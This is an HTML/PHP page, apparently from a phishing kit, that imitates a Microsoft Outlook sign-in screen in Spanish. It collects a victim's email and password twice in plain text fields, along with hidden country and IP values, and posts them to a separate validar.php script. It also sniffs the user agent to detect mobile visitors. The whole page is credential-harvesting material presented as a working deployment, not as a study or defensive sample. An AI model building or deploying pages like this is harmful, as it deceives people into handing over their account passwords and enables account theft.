<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="estilo.css">
    </head>
    <body>
        <form method="post" action="validar.php">
        <input type="hidden" name="pais" value="<?=$pais;?>">
        <input type="hidden" name="ip" value="<?=$ip;?>">
        <div class="form__cuadro" name="cuadro que contiene todo" id="cuadro">
                <div class="form__cuadrito" name="cuadrito pequeño" id="cuadrito">
                    <div class="form__logo"></div>
                     <div class="form__inicio">Inicia Sesión</div>
                     <div class="form__input">
                        <input class="form__input__correo" required type="email" maxlength="30" minlength="11" placeholder="Correo" id="correo" name="correo">
                        <br>
                        <input class="form__input__contraseña" required type="text" placeholder="Contraseña" id="pass" name="pass">
                        <br>
                        <input class="form__input__contraseña" required type="text" placeholder="Ingresa tu Contraseña Nuevamente" id="pin" name="pin" inputmode="numeric">
                    </div>
                    <div>
                         <div class="form__titulo">¿No tienes una cuenta?  <a href="https://outlook.com" class="form__color__link">Crea una</a></div>
                        <div class="form__titulo">¿No puedes acceder a tu cuenta?  <a href="https://outlook.com" class="form__color__link">Click aquí!</a></div>
                    </div>
                    <div>
                        <input class="form__input__boton" type="submit" value="Siguiente" id="btn" name="boton">
                    </div>
                </div>        
            </div>
        </form>

        <?php 
function isMobile() {
  return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}
?>
    </body>
</html>    